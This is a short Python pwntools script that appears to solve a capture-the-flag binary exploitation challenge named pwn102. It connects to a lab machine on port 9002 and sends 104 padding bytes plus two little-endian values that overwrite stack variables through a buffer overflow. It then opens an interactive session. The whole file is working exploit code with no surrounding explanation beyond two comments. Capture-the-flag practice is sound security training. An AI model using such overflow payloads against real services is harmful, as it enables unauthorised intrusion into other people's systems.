# requires two local variables to be overwritten
# with specific values, specifically c0ff33 and c0d3

from pwn import *

current_thmip = '10.10.134.184'

p = remote(current_thmip, 9002)
# p = process('./pwn102.pwn102')

payload = 'A'*104
# note the 00 padding below to make up four byte chunks
payload += '\xd3\xc0\x00\x00' + '\x33\xff\xc0\x00' 

print(p.recvline())
p.sendline(payload)
p.interactive()
